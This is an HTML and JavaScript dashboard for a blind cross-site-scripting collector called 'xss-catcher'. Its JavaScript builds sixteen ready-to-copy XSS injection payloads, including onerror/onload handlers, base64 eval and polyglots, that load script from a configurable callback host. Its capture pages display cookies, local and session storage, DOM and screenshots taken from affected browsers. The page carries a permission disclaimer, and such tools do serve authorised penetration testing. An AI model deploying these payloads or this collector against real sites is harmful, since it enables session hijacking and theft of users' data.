<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSS Catcher</title>
<style>
:root {
  --bg:   #111111;
  --sur:  #1a1a1a;
  --sur2: #222222;
  --bdr:  #2e2e2e;
  --txt:  #e0e0e0;
  --sub:  #888888;
  --dim:  #484848;
  --acc:  #4f86f7;
  --red:  #e05555;
  --grn:  #4caf7a;
  --mono: ui-monospace,'Cascadia Code','SF Mono',monospace;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--bdr);border-radius:2px}
:focus-visible{outline:1px solid var(--acc);outline-offset:2px}

/* ── HEADER ── */
header{position:sticky;top:0;z-index:100;background:var(--sur);border-bottom:1px solid var(--bdr);display:flex;align-items:center;padding:0 24px;height:48px;gap:0}
.logo{font-size:14px;font-weight:600;color:var(--txt);margin-right:24px;flex-shrink:0}
nav{display:flex;height:100%}
.tb{height:100%;padding:0 14px;background:none;border:none;border-bottom:2px solid transparent;color:var(--sub);font-size:13px;cursor:pointer;font-family:inherit;transition:color .15s,border-color .15s;white-space:nowrap;display:flex;align-items:center;gap:6px}
.tb:hover{color:var(--txt)}
.tb.on{color:var(--txt);border-bottom-color:var(--acc)}
.tb-ct{background:var(--sur2);color:var(--sub);font-size:11px;padding:1px 6px;border-radius:10px}
.tb.on .tb-ct{background:var(--acc);color:#fff}
.sp{flex:1}
.live{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--sub);margin-right:16px}
.ldot{width:6px;height:6px;border-radius:50%;background:var(--grn)}
.logout-btn{height:28px;padding:0 12px;background:none;border:1px solid var(--bdr);border-radius:4px;color:var(--sub);font-size:12px;cursor:pointer;font-family:inherit;transition:.15s}
.logout-btn:hover{color:var(--txt);border-color:var(--dim)}

/* ── PANES ── */
.pane{display:none}.pane.on{display:block}
.wrap{max-width:1200px;margin:0 auto;padding:24px}

/* ── STATS ROW ── */
.stats{display:flex;gap:36px;padding-bottom:20px;border-bottom:1px solid var(--bdr);margin-bottom:20px}
.sn{font-size:22px;font-weight:600;line-height:1.1}
.sn.hi{color:var(--red)}
.sl{font-size:12px;color:var(--sub);margin-top:2px}

/* ── FILTER CHIPS ── */
.frow{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:14px}
.fc{height:28px;padding:0 12px;background:none;border:1px solid var(--bdr);border-radius:14px;color:var(--sub);font-size:12px;cursor:pointer;transition:.15s;font-family:inherit}
.fc:hover{color:var(--txt);border-color:var(--dim)}
.fc.on{color:var(--txt);border-color:var(--acc);background:rgba(79,134,247,.08)}

/* ── CAPTURE TABLE ── */
.ctbl{width:100%;border-collapse:collapse}
.ctbl thead th{font-size:11px;color:var(--sub);font-weight:500;text-align:left;padding:6px 10px;border-bottom:1px solid var(--bdr)}
.ctbl tbody tr{border-bottom:1px solid var(--bdr);cursor:pointer}
.ctbl tbody tr:last-child{border-bottom:none}
.ctbl tbody tr:hover td{background:var(--sur)}
.ctbl td{padding:9px 10px;font-size:13px;vertical-align:middle}
.c-url{font-family:var(--mono);font-size:12px;max-width:380px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.c-hook span{font-size:11px;color:var(--sub);background:var(--sur2);padding:2px 7px;border-radius:3px}
.c-ts{color:var(--sub);font-size:12px;white-space:nowrap}
.c-ip{color:var(--sub);font-family:var(--mono);font-size:12px;white-space:nowrap}
.c-data{display:flex;gap:3px;align-items:center}
.di{font-size:10px;font-weight:600;padding:2px 5px;border-radius:3px}
.di.on{background:rgba(79,134,247,.12);color:var(--acc)}
.di.off{color:var(--dim)}
.c-thumb{width:140px}
.thumb{width:140px;height:79px;background:#000;border:1px solid var(--bdr);border-radius:3px;overflow:hidden;display:flex;align-items:center;justify-content:center}
.thumb img{width:100%;height:100%;object-fit:contain;display:block}
.thumb-ph{font-size:9px;color:var(--dim)}
.del-btn{height:26px;padding:0 10px;background:none;border:1px solid transparent;border-radius:3px;color:var(--dim);font-size:12px;cursor:pointer;font-family:inherit;transition:.15s;white-space:nowrap}
.del-btn:hover{border-color:rgba(224,85,85,.4);color:var(--red);background:rgba(224,85,85,.06)}
.empty-state{padding:48px;text-align:center;color:var(--sub);font-size:13px}

/* ── PAGINATION ── */
.pg{display:flex;justify-content:center;gap:4px;margin-top:16px}
.pg button{height:30px;min-width:30px;padding:0 10px;background:none;border:1px solid var(--bdr);border-radius:4px;color:var(--sub);font-size:12px;cursor:pointer;font-family:inherit}
.pg button:hover{color:var(--txt);border-color:var(--dim)}
.pg button.on{color:var(--txt);border-color:var(--acc);background:rgba(79,134,247,.08)}
.pg button:disabled{opacity:.3;cursor:default}

/* ── MODAL ── */
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:500;display:none;align-items:flex-start;justify-content:center;padding:32px 16px;overflow-y:auto}
.overlay.open{display:flex}
.modal{background:var(--sur);border:1px solid var(--bdr);border-radius:6px;width:100%;max-width:780px;margin:auto;overflow:hidden}
.mhdr{padding:14px 20px;border-bottom:1px solid var(--bdr);display:flex;align-items:flex-start;gap:12px}
.murl{font-family:var(--mono);font-size:12px;color:var(--txt);word-break:break-all;flex:1;line-height:1.6}
.mx{background:none;border:none;color:var(--sub);font-size:20px;cursor:pointer;padding:0;line-height:1;flex-shrink:0}
.mx:hover{color:var(--txt)}
.mshot{background:#000;border-bottom:1px solid var(--bdr);display:flex;align-items:center;justify-content:center;min-height:100px;max-height:420px;cursor:zoom-in;overflow:hidden}
.mshot img{max-width:100%;max-height:420px;object-fit:contain;display:block}
.mshot-ph{font-size:12px;color:var(--dim);padding:40px;cursor:default}
.mmeta{display:flex;flex-wrap:wrap;gap:16px;padding:10px 20px;background:var(--sur2);border-bottom:1px solid var(--bdr);font-size:12px}
.mm{display:flex;gap:6px;align-items:baseline}
.mm-k{color:var(--sub)}
.mm-v{color:var(--txt);font-family:var(--mono);font-size:11px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.mbody{padding:16px 20px;display:flex;flex-direction:column;gap:12px}
.msec-lbl{font-size:11px;color:var(--sub);margin-bottom:5px;display:flex;align-items:center;gap:8px}
.stag{font-size:10px;background:rgba(224,85,85,.12);color:var(--red);padding:1px 6px;border-radius:2px}
.msec-val{background:var(--bg);border:1px solid var(--bdr);border-radius:4px;padding:9px 11px;font-family:var(--mono);font-size:11px;color:var(--txt);white-space:pre-wrap;word-break:break-all;max-height:80px;overflow:hidden;cursor:pointer;line-height:1.65;transition:border-color .1s}
.msec-val:hover{border-color:var(--dim)}
.msec-val.exp{max-height:320px;overflow-y:auto}
.msec-val.sens{border-color:rgba(224,85,85,.3)}
.msec-val.empty{color:var(--dim);cursor:default}
.expl{font-size:11px;color:var(--acc);margin-top:4px;cursor:pointer}
.expl:hover{text-decoration:underline}
.mftr{display:flex;justify-content:flex-end;gap:8px;padding:12px 20px;border-top:1px solid var(--bdr)}

/* ── BUTTONS ── */
.btn{height:32px;padding:0 14px;border-radius:4px;font-size:12px;font-family:inherit;cursor:pointer;border:1px solid var(--bdr);background:none;color:var(--sub);transition:.15s}
.btn:hover{color:var(--txt);border-color:var(--dim)}
.btn.d{border-color:rgba(224,85,85,.4);color:var(--red)}
.btn.d:hover{background:rgba(224,85,85,.08)}

/* ── PAYLOADS ── */
.pl-top{display:flex;align-items:flex-end;gap:10px;flex-wrap:wrap;margin-bottom:16px;padding-bottom:16px;border-bottom:1px solid var(--bdr)}
.pl-top label{font-size:12px;color:var(--sub);display:block;margin-bottom:4px}
.pl-top input{height:36px;padding:0 12px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;color:var(--txt);font-size:13px;outline:none;width:260px;font-family:inherit}
.pl-top input:focus{border-color:var(--acc)}
.enc-tog{display:flex;height:36px}
.enc-tog button{padding:0 14px;font-size:12px;font-family:inherit;cursor:pointer;background:none;border:1px solid var(--bdr);color:var(--sub)}
.enc-tog button:first-child{border-radius:4px 0 0 4px}
.enc-tog button:last-child{border-radius:0 4px 4px 0;border-left:none}
.enc-tog button.on{background:var(--sur2);color:var(--txt)}
.pl-base{font-size:11px;color:var(--sub);font-family:var(--mono);margin:-8px 0 14px}
.pl-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
@media(max-width:660px){.pl-grid{grid-template-columns:1fr}}
.pl-lbl{font-size:11px;color:var(--sub);margin-bottom:4px}
.pl-row{display:flex}
.pl-inp{flex:1;height:34px;padding:0 10px;background:var(--bg);border:1px solid var(--bdr);border-right:none;border-radius:4px 0 0 4px;color:var(--txt);font-family:var(--mono);font-size:11px;outline:none;cursor:pointer}
.pl-inp:focus{cursor:text}
.pl-cp{height:34px;padding:0 10px;background:var(--sur);border:1px solid var(--bdr);border-radius:0 4px 4px 0;color:var(--sub);font-size:12px;cursor:pointer;font-family:inherit;transition:.15s;white-space:nowrap}
.pl-cp:hover{color:var(--txt);background:var(--sur2)}
.pl-foot{font-size:12px;color:var(--sub);margin-top:14px;padding-top:14px;border-top:1px solid var(--bdr)}

/* ── SETTINGS ── */
.sg{display:grid;grid-template-columns:1fr 1fr;gap:24px}
@media(max-width:640px){.sg{grid-template-columns:1fr}}
.ss h3{font-size:13px;font-weight:600;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--bdr)}
.sr{margin-bottom:14px}
.sl2{font-size:12px;color:var(--sub);margin-bottom:5px}
.sv{font-family:var(--mono);font-size:12px;color:var(--txt);background:var(--sur2);border:1px solid var(--bdr);border-radius:4px;padding:8px 12px;word-break:break-all}
.sinp{width:100%;height:36px;padding:0 12px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;color:var(--txt);font-size:13px;outline:none;font-family:inherit}
.sinp:focus{border-color:var(--acc)}
.sta{width:100%;padding:10px 12px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;color:var(--txt);font-size:13px;outline:none;resize:vertical;min-height:90px;font-family:inherit}
.sta:focus{border-color:var(--acc)}
.sn2{font-size:12px;color:var(--sub);margin-top:4px}

/* ── TOASTS ── */
#toasts{position:fixed;bottom:20px;right:20px;z-index:999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
.toast{background:var(--sur);border:1px solid var(--bdr);border-radius:4px;padding:8px 14px;font-size:13px;color:var(--sub);opacity:0;transform:translateY(6px);transition:.2s;pointer-events:none}
.toast.show{opacity:1;transform:none}
.toast.ok{border-color:var(--acc);color:var(--acc)}
.toast.err{border-color:var(--red);color:var(--red)}
</style>
</head>
<body>

<header>
  <div class="logo">xss-catcher</div>
  <nav>
    <button class="tb on" onclick="showTab('captures')">Captures <span class="tb-ct" id="hdr-ct">0</span></button>
    <button class="tb" onclick="showTab('payloads')">Payloads</button>
    <button class="tb" onclick="showTab('settings')">Settings</button>
  </nav>
  <div class="sp"></div>
  <div class="live"><div class="ldot"></div><span>live</span></div>
  <form method="POST" action="/logout" style="margin:0">
    <button class="logout-btn" type="submit">Sign out</button>
  </form>
</header>

<!-- CAPTURES -->
<div class="pane on" id="pane-captures">
  <div class="wrap">
    <div class="stats">
      <div><div class="sn" id="st-total">—</div><div class="sl">Total</div></div>
      <div><div class="sn" id="st-today">—</div><div class="sl">Today</div></div>
      <div><div class="sn" id="st-dom">—</div><div class="sl">Domains</div></div>
    </div>
    <div class="frow" id="frow"></div>
    <table class="ctbl">
      <thead>
        <tr>
          <th>Time</th>
          <th>URL</th>
          <th>Hook</th>
          <th>IP</th>
          <th>Data</th>
          <th></th>
          <th></th>
        </tr>
      </thead>
      <tbody id="ctbody"></tbody>
    </table>
    <div id="pg-wrap"></div>
  </div>
</div>

<!-- PAYLOADS -->
<div class="pane" id="pane-payloads">
  <div class="wrap">
    <div class="pl-top">
      <div>
        <label>Callback host</label>
        <input id="pl-host" placeholder="auto" oninput="saveHost()">
      </div>
      <div>
        <label>Hook name or custom domain</label>
        <input id="pl-dom" placeholder="hook-name" oninput="renderPL()">
      </div>
      <div>
        <label>Encoding</label>
        <div class="enc-tog">
          <button class="on" id="enc-off" onclick="setEnc(false)">Raw</button>
          <button id="enc-on" onclick="setEnc(true)">URL-encoded</button>
        </div>
      </div>
    </div>
    <div class="pl-base" id="pl-base"></div>
    <div class="pl-grid" id="pl-grid"></div>
    <div class="pl-foot">Use these payloads only on systems you have explicit permission to test.</div>
  </div>
</div>

<!-- SETTINGS -->
<div class="pane" id="pane-settings">
  <div class="wrap">
    <div class="sg">
      <div class="ss">
        <h3>Server</h3>
        <div class="sr">
          <div class="sl2">Collector endpoint</div>
          <div class="sv" id="s-ep"></div>
        </div>
        <div class="sr">
          <div class="sl2">Server URL</div>
          <div class="sv" id="s-srv"></div>
        </div>
      </div>
      <div class="ss">
        <h3>Preferences</h3>
        <div class="sr">
          <div class="sl2">Notepad</div>
          <textarea class="sta" id="notepad" rows="4" placeholder="Notes, injection points, findings…" oninput="localStorage.setItem('xss_note',this.value)"></textarea>
        </div>
        <div class="sr">
          <div class="sl2">Domain blacklist</div>
          <input class="sinp" id="blacklist" placeholder="scanner.example.com, noise.io" oninput="localStorage.setItem('xss_bl',this.value)">
          <div class="sn2">Comma-separated — hides matching captures from the list.</div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- DETAIL MODAL -->
<div class="overlay" id="overlay" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="mhdr">
      <div class="murl" id="m-url"></div>
      <button class="mx" onclick="closeModal()">×</button>
    </div>
    <div class="mshot" id="m-shot"><div class="mshot-ph">No screenshot</div></div>
    <div class="mmeta" id="m-meta"></div>
    <div class="mbody" id="m-body"></div>
    <div class="mftr">
      <button class="btn" onclick="copyJSON()">Copy JSON</button>
      <button class="btn d" id="m-del" onclick="delCapture()">Delete</button>
      <button class="btn" onclick="closeModal()">Close</button>
    </div>
  </div>
</div>

<div id="toasts"></div>

<script>
var PAGE = 0;
var PAGE_SIZE = 25;
var TOTAL = 0;
var FILTER_HOOK = null;
var SELECTED = null;
var ENC = false;

function apiFetch(url, opts) {
  return fetch(url, opts || {}).then(function(r) {
    if (r.status === 401) { window.location.href = '/login'; throw new Error('session expired'); }
    return r;
  });
}

// ── TABS ─────────────────────────────────────────────────────────────────
function showTab(name) {
  document.querySelectorAll('.pane').forEach(function(p) { p.classList.remove('on'); });
  document.querySelectorAll('.tb').forEach(function(b) { b.classList.remove('on'); });
  document.getElementById('pane-' + name).classList.add('on');
  var map = { captures: 0, payloads: 1, settings: 2 };
  document.querySelectorAll('.tb')[map[name]].classList.add('on');
  if (name === 'payloads') renderPL();
}

// ── STATS ─────────────────────────────────────────────────────────────────
function loadStats() {
  apiFetch('/api/stats')
    .then(function(r) { return r.json(); })
    .then(function(d) {
      document.getElementById('st-total').textContent = d.total;
      document.getElementById('st-today').textContent = d.today;
      document.getElementById('st-dom').textContent = d.unique_domains;
    })
    .catch(function() {});
}

// ── HOOKS ─────────────────────────────────────────────────────────────────
function loadHooks() {
  apiFetch('/api/hooks')
    .then(function(r) { return r.json(); })
    .then(function(rows) {
      var html = '<button class="fc on" onclick="setFilter(null,this)">All</button>';
      rows.forEach(function(r) {
        html += '<button class="fc" onclick="setFilter(\'' + esc(r.hook) + '\',this)">' + esc(r.hook) + ' <span style="color:var(--dim)">' + r.count + '</span></button>';
      });
      document.getElementById('frow').innerHTML = html;
    })
    .catch(function() {});
}

function setFilter(hook, el) {
  FILTER_HOOK = hook;
  PAGE = 0;
  document.querySelectorAll('.fc').forEach(function(c) { c.classList.remove('on'); });
  el.classList.add('on');
  loadCaptures();
}

// ── CAPTURES ──────────────────────────────────────────────────────────────
function loadCaptures() {
  var url = '/api/captures?limit=' + PAGE_SIZE + '&offset=' + (PAGE * PAGE_SIZE);
  if (FILTER_HOOK) url += '&hook=' + encodeURIComponent(FILTER_HOOK);
  apiFetch(url)
    .then(function(r) { return r.json(); })
    .then(function(d) {
      TOTAL = d.total;
      document.getElementById('hdr-ct').textContent = d.total;
      renderCaptures(filterBL(d.rows));
      renderPagination();
    })
    .catch(function() {});
}

function filterBL(rows) {
  var bl = (localStorage.getItem('xss_bl') || '').split(',').map(function(s) { return s.trim().toLowerCase(); }).filter(Boolean);
  if (!bl.length) return rows;
  return rows.filter(function(r) {
    try { var h = new URL(r.uri).hostname.toLowerCase(); return !bl.some(function(b) { return h === b || h.endsWith('.' + b); }); }
    catch(e) { return true; }
  });
}

function renderCaptures(rows) {
  var tb = document.getElementById('ctbody');
  if (!rows.length) {
    tb.innerHTML = '<tr><td colspan="7"><div class="empty-state">No captures.</div></td></tr>';
    return;
  }
  tb.innerHTML = rows.map(function(r) {
    var host = '', path = '';
    try { var u = new URL(r.uri); host = u.hostname; path = u.pathname; } catch(e) { host = r.uri.slice(0, 60); }
    var hc = r.cookies && r.cookies.length > 4;
    var hl = r.localstorage && r.localstorage !== '{}' && r.localstorage.length > 2;
    var hs = r.sessionstorage && r.sessionstorage !== '{}' && r.sessionstorage.length > 2;
    var thumb = r.screenshot && r.screenshot.length > 100
      ? '<td class="c-thumb"><div class="thumb"><img src="' + r.screenshot + '" alt=""></div></td>'
      : '<td class="c-thumb"><div class="thumb"><div class="thumb-ph">—</div></div></td>';
    return '<tr onclick="openCapture(\'' + r.id + '\')">'
      + '<td class="c-ts">' + relTime(r.captured_at) + '</td>'
      + '<td class="c-url">' + esc(host) + esc(path) + '</td>'
      + '<td class="c-hook"><span>' + esc(r.hook) + '</span></td>'
      + '<td class="c-ip">' + esc(r.ip || '—') + '</td>'
      + '<td><div class="c-data">'
        + '<span class="di ' + (hc?'on':'off') + '">C</span>'
        + '<span class="di ' + (hl?'on':'off') + '">L</span>'
        + '<span class="di ' + (hs?'on':'off') + '">S</span>'
      + '</div></td>'
      + thumb
      + '<td><button class="del-btn" onclick="deleteRow(\'' + r.id + '\',event)">Delete</button></td>'
      + '</tr>';
  }).join('');
}

function renderPagination() {
  var pages = Math.ceil(TOTAL / PAGE_SIZE);
  var wrap = document.getElementById('pg-wrap');
  if (pages <= 1) { wrap.innerHTML = ''; return; }
  var html = '<div class="pg">';
  html += '<button onclick="goPage(' + (PAGE-1) + ')" ' + (PAGE===0?'disabled':'') + '>←</button>';
  for (var i = 0; i < pages; i++) {
    html += '<button class="' + (i===PAGE?'on':'') + '" onclick="goPage(' + i + ')">' + (i+1) + '</button>';
  }
  html += '<button onclick="goPage(' + (PAGE+1) + ')" ' + (PAGE>=pages-1?'disabled':'') + '>→</button>';
  html += '</div>';
  wrap.innerHTML = html;
}

function goPage(p) { PAGE = p; loadCaptures(); }

function deleteRow(id, event) {
  event.stopPropagation();
  apiFetch('/api/captures/' + id, { method: 'DELETE' })
    .then(function() { loadCaptures(); loadHooks(); loadStats(); toast('Deleted', ''); })
    .catch(function() { toast('Delete failed', 'err'); });
}

// ── MODAL ─────────────────────────────────────────────────────────────────
function openCapture(id) {
  apiFetch('/api/captures/' + id)
    .then(function(r) { return r.json(); })
    .then(function(cap) {
      SELECTED = cap;
      document.getElementById('m-url').textContent = cap.uri;

      var shot = document.getElementById('m-shot');
      if (cap.screenshot && cap.screenshot.length > 100) {
        shot.innerHTML = '<img src="' + cap.screenshot + '" alt="screenshot">';
        shot.onclick = function() { window.open(cap.screenshot, '_blank'); };
      } else {
        shot.innerHTML = '<div class="mshot-ph">No screenshot</div>';
        shot.onclick = null;
      }

      document.getElementById('m-meta').innerHTML =
        mm('Hook', cap.hook) + mm('IP', cap.ip) + mm('Time', isoTime(cap.captured_at)) +
        mm('Origin', cap.origin) + mm('Lang', cap.lang) + mm('GPU', (cap.gpu||'').slice(0,50));

      var body = document.getElementById('m-body');
      body.innerHTML = '';
      addSec(body, 'Cookies', cap.cookies, true);
      addSec(body, 'LocalStorage', cap.localstorage, true);
      addSec(body, 'SessionStorage', cap.sessionstorage, false);
      addSec(body, 'Referrer', cap.referrer, false);
      addSec(body, 'User Agent', cap.user_agent, false);
      addSec(body, 'DOM', cap.dom, false);

      document.getElementById('overlay').classList.add('open');
    })
    .catch(function() {});
}

function closeModal() { document.getElementById('overlay').classList.remove('open'); SELECTED = null; }

function mm(k, v) {
  return '<div class="mm"><span class="mm-k">' + esc(k) + '</span><span class="mm-v" title="' + esc(v||'') + '">' + esc((v||'—').slice(0,80)) + '</span></div>';
}

function addSec(parent, label, val, sensitive) {
  var empty = !val || val === '{}' || val === '';
  var sec = document.createElement('div');
  var lbl = '<div class="msec-lbl">' + esc(label) + (sensitive && !empty ? '<span class="stag">sensitive</span>' : '') + '</div>';
  var cls = 'msec-val' + (sensitive && !empty ? ' sens' : '') + (empty ? ' empty' : '');
  sec.innerHTML = lbl + '<div class="' + cls + '" onclick="toggleExp(this)">' + esc(empty ? '(empty)' : val) + '</div>';
  if (!empty && val.length > 120) {
    var el = document.createElement('div');
    el.className = 'expl';
    el.textContent = 'expand';
    el.onclick = function() {
      var v = sec.querySelector('.msec-val');
      v.classList.toggle('exp');
      el.textContent = v.classList.contains('exp') ? 'collapse' : 'expand';
    };
    sec.appendChild(el);
  }
  parent.appendChild(sec);
}

function toggleExp(el) { if (!el.classList.contains('empty')) el.classList.toggle('exp'); }

function delCapture() {
  if (!SELECTED) return;
  if (!confirm('Delete this capture?')) return;
  apiFetch('/api/captures/' + SELECTED.id, { method: 'DELETE' })
    .then(function() { closeModal(); loadCaptures(); loadHooks(); loadStats(); toast('Deleted', ''); })
    .catch(function() { toast('Delete failed', 'err'); });
}

function copyJSON() {
  if (!SELECTED) return;
  navigator.clipboard && navigator.clipboard.writeText(JSON.stringify(SELECTED, null, 2));
  toast('Copied', 'ok');
}

// ── PAYLOADS ──────────────────────────────────────────────────────────────
var PL = [
  'script src', 'img onerror (b64)', 'input autofocus (b64)', 'javascript: URI',
  'inline script', 'onmouseover div', 'fetch + eval', 'audio onerror',
  'iframe javascript:', 'polyglot ★', 'body onload', 'svg onload',
  'details ontoggle', 'object data', 'data: polyglot ★', 'onmouseover attr',
];

function buildPL(src, b64, i) {
  var v = [
    '\'"><script src=' + src + '><\/script>',
    '"><img src=x id=' + b64 + ' onerror=eval(atob(this.id))>',
    '"><input onfocus=eval(atob(this.id)) id=' + b64 + ' autofocus>',
    'javascript:eval(atob(\'' + b64 + '\'))',
    'var a=document.createElement("script");a.src="' + src + '";document.body.appendChild(a);',
    '<div onmouseover="var a=document.createElement(\'script\');a.src=\'' + src + '\';document.body.appendChild(a)">x<\/div>',
    '<script>fetch("' + src + '").then(r=>r.text()).then(t=>eval(t))<\/script>',
    '<audio src=x onerror="var a=document.createElement(\'script\');a.src=\'' + src + '\';document.body.appendChild(a)">',
    '<iframe src="javascript:var a=document.createElement(\'script\');a.src=\'' + src + '\';document.body.appendChild(a)"><\/iframe>',
    '\'"--><img src=x onerror=eval(atob(this.id)) id=' + b64 + '>',
    '<body onload="var a=document.createElement(\'script\');a.src=\'' + src + '\';document.body.appendChild(a)">',
    '<svg onload="var a=document.createElement(\'script\');a.src=\'' + src + '\';document.body.appendChild(a)">',
    '<details open ontoggle="var a=document.createElement(\'script\');a.src=\'' + src + '\';document.body.appendChild(a)">',
    '<object data="' + src + '">',
    '\'"><script src=//' + src.replace(/^https?:\/\//, '') + '>/*<\/script>',
    '" onmouseover="window[\'eval\'](atob(\'' + b64 + '\'))" x="',
  ];
  return v[i] || '';
}

function setEnc(v) {
  ENC = v;
  document.getElementById('enc-off').classList.toggle('on', !v);
  document.getElementById('enc-on').classList.toggle('on', v);
  renderPL();
}

// Callback host used to build payload URLs — defaults to wherever the dashboard
// is served from, but can be pointed at an arbitrary IP/host:port or domain.
function normHost(v) {
  v = String(v || '').trim().replace(/\/+$/, '');
  if (!v) return window.location.origin;
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(v)) v = window.location.protocol + '//' + v;
  return v.replace(/\/+$/, '');
}

function callbackBase() {
  return normHost(localStorage.getItem('xss_host'));
}

function saveHost() {
  localStorage.setItem('xss_host', document.getElementById('pl-host').value.trim());
  renderPL();
  document.getElementById('s-ep').textContent = callbackBase() + '/c/{hook-name}';
}

function renderPL() {
  var raw = document.getElementById('pl-dom').value.trim();
  var base = callbackBase();
  document.getElementById('pl-base').textContent = 'Payloads call back to ' + base + '/c/' + (raw || 'hook-name');
  var src = raw.includes('://') || (raw.includes('.') && raw.includes('/'))
    ? raw
    : base + '/c/' + (raw || 'hook-name');
  var js = 'var a=document.createElement("script");a.src="' + src + '";document.body.appendChild(a);';
  var b64 = btoa(js);
  document.getElementById('pl-grid').innerHTML = PL.map(function(lbl, i) {
    var v = buildPL(src, b64, i);
    if (ENC) v = encodeURIComponent(v);
    return '<div>'
      + '<div class="pl-lbl">' + esc(lbl) + '</div>'
      + '<div class="pl-row">'
        + '<input class="pl-inp" id="pi' + i + '" value="' + esc(v) + '" onclick="this.select()" readonly>'
        + '<button class="pl-cp" onclick="cpPL(' + i + ')">Copy</button>'
      + '</div></div>';
  }).join('');
}

function cpPL(i) {
  var el = document.getElementById('pi' + i);
  if (el) { navigator.clipboard && navigator.clipboard.writeText(el.value); toast('Copied', 'ok'); }
}

// ── SETTINGS ──────────────────────────────────────────────────────────────
function loadSettings() {
  document.getElementById('pl-host').placeholder = window.location.origin;
  document.getElementById('pl-host').value = localStorage.getItem('xss_host') || '';
  document.getElementById('s-ep').textContent = callbackBase() + '/c/{hook-name}';
  document.getElementById('s-srv').textContent = window.location.origin;
  document.getElementById('notepad').value = localStorage.getItem('xss_note') || '';
  document.getElementById('blacklist').value = localStorage.getItem('xss_bl') || '';
}

// ── HELPERS ───────────────────────────────────────────────────────────────
function esc(s) {
  return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
function relTime(ts) {
  var d = Date.now() - ts;
  if (d < 60000) return Math.floor(d/1000) + 's ago';
  if (d < 3600000) return Math.floor(d/60000) + 'm ago';
  if (d < 86400000) return Math.floor(d/3600000) + 'h ago';
  return Math.floor(d/86400000) + 'd ago';
}
function isoTime(ts) {
  return new Date(ts).toISOString().replace('T',' ').slice(0,19);
}
function toast(msg, cls) {
  var el = document.createElement('div');
  el.className = 'toast' + (cls ? ' ' + cls : '');
  el.textContent = msg;
  document.getElementById('toasts').appendChild(el);
  requestAnimationFrame(function() { requestAnimationFrame(function() { el.classList.add('show'); }); });
  setTimeout(function() { el.classList.remove('show'); setTimeout(function() { el.remove(); }, 300); }, 2500);
}

document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });

// ── INIT ──────────────────────────────────────────────────────────────────
loadStats();
loadHooks();
loadCaptures();
loadSettings();
setInterval(function() { loadStats(); loadCaptures(); }, 15000);
</script>
